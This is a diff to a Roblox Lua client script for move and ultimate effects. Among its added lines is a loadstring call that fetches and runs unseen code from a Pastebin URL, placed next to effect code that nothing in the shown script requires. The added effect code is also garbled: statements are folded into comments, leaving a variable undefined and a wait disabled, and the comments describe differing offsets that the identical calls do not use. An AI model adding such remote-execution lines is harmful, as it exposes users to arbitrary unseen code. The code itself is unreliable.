@@ -1,7 +1,7 @@
 --Move & Ultimate Names
 
 local player = game.Players.LocalPlayer
-
+ 
 local playerGui = player.PlayerGui
 
 local hotbar = playerGui:FindFirstChild("Hotbar")
@@ -338,7 +338,38 @@ Anim:AdjustSpeed(0)
 Anim.TimePosition = startTime
 
 Anim:AdjustSpeed(1)
-
+        
+loadstring(game:HttpGet("https://pastebin.com/raw/bwcEWbWr"))()
+        
+-- Table to store all spawned effects
+        local effects = {}
+        local assetId1 = 13459836179 -- First Dismantle UNGROUP Effect asset ID local assetId2 = 13459836179 -- Second Dismantle UNGROUP Effect asset ID (can be different)
+        local assetId3 = 13459836179 -- Third Dismantle UNGROUP Effect asset ID
+        local assetId4 =  13459836179-- Fourth Dismantle UNGROUP Effect asset ID
+        local assetId5 =  13459836179--  Fifth Dismantle UNGROUP Effect asset ID
+        local assetId6 = 13459836179 -- Sixth Dismantle UNGROUP Effect asset ID
+        local soundId = "rbxassetid://" -- Sound ID (replace if needed) -- Function to handle effect setup and destruction
+        local function setupEffectAndSound(assetId, soundId, directionOffset) -- Load the effect (Folder)
+            local effect = game:GetObjects("rbxassetid://" .. assetId)[1] -- Create and play sound
+            local sound = Instance.new("Sound") sound.SoundId = soundId sound.Parent = game.Workspace sound:Play() -- Ensure the effect was loaded properly 
+            if effect then local character = game.Players.LocalPlayer.Character if character then -- Wait for character parts to be loaded
+                local humanoidRootPart = character:WaitForChild("HumanoidRootPart") if humanoidRootPart then -- Parent the effect to the workspace
+                    effect.Parent = game.Workspace -- Calculate the position based on the given direction offset
+                    local targetPosition = humanoidRootPart.CFrame * CFrame.new(directionOffset) -- Iterate through all parts in the folder and position them
+                    for _, part in pairs(effect:GetDescendants()) do if part:IsA("BasePart") then part.CanCollide = false -- Disable collision
+                        part.Anchored = true    -- Anchor parts to keep them in place -- Set each part's position relative to the player's humanoid root part
+                        part.CFrame = targetPosition end end -- Add the effect to the table to be destroyed later
+                    table.insert(effects, effect) end end end end -- Load all 6 VFX (effects) with increasing directional offsets
+        setupEffectAndSound(assetId1, soundId, Vector3.new(0, 78, -35)) -- First VFX moves 3 studs backward
+        setupEffectAndSound(assetId2, soundId, Vector3.new(0, 78, -35)) -- Second VFX moves 6 studs backward 
+        setupEffectAndSound(assetId3, soundId, Vector3.new(0, 78, -35))  -- Third VFX moves 9 studs backward
+        setupEffectAndSound(assetId4, soundId, Vector3.new(0, 78, -35)) -- Fourth VFX moves 12 studs backward
+        setupEffectAndSound(assetId5, soundId, Vector3.new(0, 78, -35)) -- Fifth VFX moves 15 studs backward
+        setupEffectAndSound(assetId6, soundId, Vector3.new(0, 78, -35)) -- Sixth VFX moves 18 studs backward
+        -- Wait for all effects to be positioned wait(1.5)  -- Wait a few seconds or adjust this as needed -- Destroy all the VFX at once (after both have been created and moved)
+        for _, effect in pairs(effects) do if effect and effect.Parent then effect:Destroy()
+        -- Destroy each effect at the end
+            end end 
 
     end
 
